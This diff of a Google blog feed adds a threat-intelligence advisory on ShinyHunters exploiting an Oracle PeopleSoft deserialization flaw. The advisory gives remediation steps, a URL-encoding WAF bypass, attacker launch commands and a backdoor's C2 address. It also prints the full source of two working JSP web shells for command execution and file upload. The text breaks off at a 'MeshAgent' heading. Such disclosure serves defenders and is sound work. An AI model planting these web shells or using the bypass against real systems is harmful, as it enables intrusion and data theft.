@@ -2,7 +2,7 @@
 <feed xmlns:media="http://search.yahoo.com/mrss/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <id>https://blog.google/</id>
   <title>Google Blogs</title>
-  <updated>2026-09-25T21:48:21.433123+00:00</updated>
+  <updated>2026-09-26T00:50:42.306889+00:00</updated>
   <author>
     <name>Google</name>
   </author>
@@ -672,6 +672,605 @@
       <media:thumbnail url="https://storage.googleapis.com/gweb-cloudblog-publish/images/1_K3ph3LP.max-1000x1000.png"/>
     </media:group>
     <link rel="enclosure" href="https://storage.googleapis.com/gweb-cloudblog-publish/images/1_K3ph3LP.max-1000x1000.png" type="image/png" length="0"/>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft</id>
+    <title>ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft</title>
+    <updated>2026-09-25T14:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Introduction&lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt; &lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As an update to the June 2026 post, &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; in place of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;. Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the endpoint on systems whose operators may have believed their WAF rules had mitigated the exposure.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Our analysis indicates that the threat actor expanded their targeting in this recent campaign, deploying web shells on dozens of systems globally, spanning higher education, technology, IT services, healthcare, agriculture, transportation, and government.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant recommends that organizations running Oracle PeopleSoft take the following immediate actions. Additional remediation and hardening guidance is included later in this post.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table border="1" style="border-collapse: collapse; width: 100%;"&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="width: 98.0683%;"&gt;
+&lt;h3 style="text-align: left;"&gt;&lt;span style="vertical-align: baseline; color: #000000;"&gt;Remediation and Hardening Quick Guide&lt;/span&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;span style="vertical-align: baseline;"&gt;Apply the Oracle Security Alert patch for CVE-2026-35273. WAF rules and path-based blocking are not a substitute for patching.&lt;/span&gt;&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Disable the Environment Management Hub (EMHub) service in multi-server configurations, or remove the PSEMHUB application entirely in single-server configurations, as advised in Oracle's &lt;/span&gt;&lt;a href="https://www.oracle.com/security-alerts/alert-cve-2026-35273.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;security alert guidance&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Search PIA WebLogic access logs for requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and any percent-encoded variant (for example, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;), particularly &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/hub&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files from external source IP addresses.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Inspect &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; for files that are not part of the shipped product, including but not limited to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jspx&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Rotate credentials readable by the PeopleSoft application service account, including database connection strings in &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;psappsrv.cfg&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, Integration Broker credentials, and any cloud credentials reachable from the web tier.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor outbound traffic from PeopleSoft hosts to the network indicators listed in this post, and review endpoints for unexpected MeshCentral agents.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 1: Remediation and hardening quick guide&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Background: From Zero-Day to N-Day&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In June 2026, we reported a UNC6240 campaign that exploited CVE-2026-35273 as a zero-day between May 27 and June 9, 2026, predominantly against higher education institutions. Oracle released an out-of-band Security Alert on June 10, 2026. Mandiant’s June guidance recommended patching and, where patching or disabling EMHub was not immediately possible, blocking external access to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB/*&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; at the perimeter, noting that WAF body-inspection rules alone were insufficient.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The current campaign demonstrates that UNC6240 adapted to published defensive guidance, targeting organizations that implemented WAF rules but did not patch the vulnerability.  &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Attack Lifecycle&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We observed a consistent sequence of events in targeted PeopleSoft environments, progressing from discovery and verification to web shell deployment and hands-on-keyboard activity.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Target Verification&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Before exploitation, targeted servers typically received five to 15 &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/hub&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; containing a serialized Java object. Unpatched servers respond with the host operating system without writing files or disrupting the service, allowing the threat actor to quietly confirm exploitability. On hosts that the threat actor validated but did not yet exploit, organizations may see this request in logs, with no follow-on activity.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;WAF Bypass&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;All requests addressed the vulnerable servlet through a url-encoded path. &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;%50&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; is the encoded form of the character &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;P&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;. WAF and proxy rules that match the literal string &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; before decoding do not match &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, while WebLogic decodes the path and serves the application normally.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defenders should assume that threat actors may use any percent-encoded, mixed-case, or otherwise non-normalized variant of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and should enforce blocking on the normalized path.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="PSEMHUB WAF bypass" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_3_PSEMHUB_WAF_bypass.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Figure 2: PSEMHUB WAF bypass&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Exploitation&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We observed two exploitation methods, both abusing Java deserialization in the PSEMHUB hub servlet:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Web shell deployment.&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; To access web shells behind some load balanced environments, the threat actor sent a burst of multiple &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/hub&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, followed by the creation of a new JSP files, such as &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, or sequentially numbered JSP files in the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;PSEMHUB.war&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; directory. The repetition likely ensures that every node behind a load balancer receives a copy of the web shell, so organizations should check all WebLogic nodes, not only the first one identified.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Fileless command execution.&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/hub&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; that return command output directly in the HTTP response, with no file written to disk. On the host, this appears as shell processes (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;cmd.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/bin/sh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) spawned by the WebLogic Java process. Detections that rely on JSP file creation will not identify this method.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Post-Exploitation Tooling&lt;/span&gt;&lt;/h3&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Dual Web Shells&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To establish persistent access and stage follow-on payloads, the threat actor deployed two complementary, single-line JSP web shells into the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;PSEMHUB.war&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; directory. Both shells were designed to minimize web application firewall (WAF) detections during post-exploitation.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The primary shell, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, provides cross-platform command execution. Rather than passing cleartext commands in URL query strings, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; accepts hex-encoded commands via HTTP &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;c&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) along with an optional execution timeout (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;t&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;). It automatically detects the underlying operating system, spawning &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;cmd.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; on Windows or reconstructing &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/bin/sh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; from an ASCII character array on Linux to avoid static string signatures, and returns the process output prefixed with &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;R:&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-markup"&gt;&lt;code&gt;&amp;lt;%@ page import="java.util.*,java.io.*" %&amp;gt;&amp;lt;%
+String h = request.getParameter("c");
+String ts = request.getParameter("t");
+if (h != null) {
+  int t = ts != null ? Integer.parseInt(ts) : 30;
+  StringBuilder cs = new StringBuilder();
+  for (int i = 0; i + 1 &amp;lt; h.length(); i += 2) {
+    cs.append((char) Integer.parseInt(h.substring(i, i + 2), 16));
+  }
+  String c = cs.toString();
+  boolean wn = System.getProperty("os.name").toLowerCase().contains("win");
+  Process p = new ProcessBuilder(
+      wn ? new String[]{"cmd.exe", "/c", c}
+         : new String[]{new String(new char[]{47,98,105,110,47,115,104}), "-c", c}
+  ).start();
+  InputStream a = p.getInputStream();
+  InputStream g = p.getErrorStream();
+  byte[] b = new byte[8192];
+  int n;
+  StringBuilder sb = new StringBuilder();
+  long end = System.currentTimeMillis() + t * 1000L;
+  while (System.currentTimeMillis() &amp;lt; end) {
+    if (a.available() &amp;gt; 0) { n = a.read(b); if (n &amp;gt; 0) sb.append(new String(b, 0, n)); }
+    else if (g.available() &amp;gt; 0) { n = g.read(b); if (n &amp;gt; 0) sb.append(new String(b, 0, n)); }
+    else {
+      try { p.exitValue(); break; }
+      catch (IllegalThreadStateException e2) {
+        try { Thread.sleep(40); } catch (Exception e3) {}
+      }
+    }
+  }
+  while (a.available() &amp;gt; 0) { n = a.read(b); if (n &amp;gt; 0) sb.append(new String(b, 0, n)); }
+  while (g.available() &amp;gt; 0) { n = g.read(b); if (n &amp;gt; 0) sb.append(new String(b, 0, n)); }
+  out.print("R:" + sb.toString());
+}
+%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 3: &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; cross-platform command execution web shell (formatted for readability)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;When staging larger binaries on compromised Windows hosts, the threat actor deployed a second servlet, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (along with an offset-based variant, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u2.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;). This shell decodes Base64-encoded file chunks (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;a&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) and writes or appends them (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;m&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) to a target path (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;n&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) in 150 KB increments, bypassing HTTP request-size limits and avoiding PeopleSoft's native &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;FILECHUNKING&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; handlers. It also includes a secondary parameter (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;x&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) to execute &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;cmd.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; commands once file reassembly is complete.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-markup"&gt;&lt;code&gt;&amp;lt;%@ page import="java.util.*,java.io.*,java.nio.file.*" %&amp;gt;&amp;lt;%
+String n = request.getParameter("n");
+String a = request.getParameter("a");
+String m = request.getParameter("m");
+if (n != null &amp;amp;&amp;amp; a != null) {
+  try {
+    byte[] b = java.util.Base64.getDecoder().decode(a);
+    if ("a".equals(m)) {
+      java.io.FileOutputStream f = new java.io.FileOutputStream(n, true);
+      f.write(b);
+      f.close();
+    } else {
+      java.nio.file.Files.write(java.nio.file.Paths.get(n), b);
+    }
+    out.print("W:" + b.length);
+  } catch (Exception e) {
+    out.print("E:" + e);
+  }
+}
+String x = request.getParameter("x");
+if (x != null) {
+  try {
+    ProcessBuilder pb = new ProcessBuilder(new String[]{"cmd.exe", "/c", x});
+    pb.redirectErrorStream(true);
+    Process p = pb.start();
+    java.io.InputStream i = p.getInputStream();
+    byte[] buf = new byte[8192];
+    int k;
+    StringBuilder sb = new StringBuilder();
+    long end = System.currentTimeMillis() + 12000;
+    while (System.currentTimeMillis() &amp;lt; end) {
+      if (i.available() &amp;gt; 0) {
+        k = i.read(buf);
+        if (k &amp;gt; 0) sb.append(new String(buf, 0, k));
+      } else {
+        try { p.exitValue(); break; }
+        catch (Exception e2) { Thread.sleep(30); }
+      }
+    }
+    out.print("R:" + sb.toString());
+  } catch (Exception e) {
+    out.print("X:" + e);
+  }
+}
+%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 4: &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; chunked file upload and execution web shell (formatted for readability)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Trojanized Installer and Multi-Stage Backdoor (&lt;/span&gt;&lt;code style="font-style: italic; vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;)&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;On compromised Windows servers, the threat actor used &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u2.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) to upload and execute a 5.2 MB binary named &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (tracked as SIDEEYE) inside the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;PSEMHUB.war&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; directory. While &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; masquerades as a signed installer for the Light Alloy media player, analysis revealed that it is a trojanized installer containing a three-stage execution chain that loads SIDEEYE in memory. The analyzed sample was signed with a valid Extended Validation (EV) certificate issued to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Tobias Weihmann Software Development OU&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; via Sectigo. GTIG has contacted Sectigo for revocation of this certificate.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;When executed, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (Stage 1) decompresses and loads a VMProtect 3 (VMP3)-protected second-stage launcher into memory. This launcher decrypts additional data blocks embedded within &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and loads and executes the third stage in memory. Stage 3 is the SIDEEYE C++ backdoor that communicates with its command-and-control (C2) server (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;162[.]219[.]30[.]165&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) over raw TCP using separate control (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;TCP/3333&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) and data (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;TCP/3334&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) ports. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Initial analysis indicates that SIDEEYE supports:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Browser and desktop application credential theft&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Process and file management&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Interactive reverse shell and reverse proxy capabilities&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;After uploading the binary in chunks via &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, the threat actor verified the reassembled file size on disk, launched &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; as a background process, and confirmed that it remained running:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-markup"&gt;&lt;code&gt;dir applications\peoplesoft\PSEMHUB.war\Ple64.exe
+for %F in (applications\peoplesoft\PSEMHUB.war\Ple64.exe) do @echo %~zF
+cmd.exe /c start /b "" applications\peoplesoft\PSEMHUB.war\Ple64.exe
+tasklist | findstr /i Ple64&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 5: Threat actor verifying upload and execution of the trojanized &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (SIDEEYE) backdoor&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Tunneling with Neo-reGeorg&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Alongside the deployment of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, the threat actor staged the open-source Neo-reGeorg tunneling toolkit and deployed its &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jspx&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; servlets into victim web directories. This toolkit routes SOCKS5 proxy traffic through ordinary HTTP and HTTPS connections to the web tier, enabling internal discovery and lateral movement from the PeopleSoft host.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;MeshAgent &lt;/span&gt;&lt;/h4&gt;
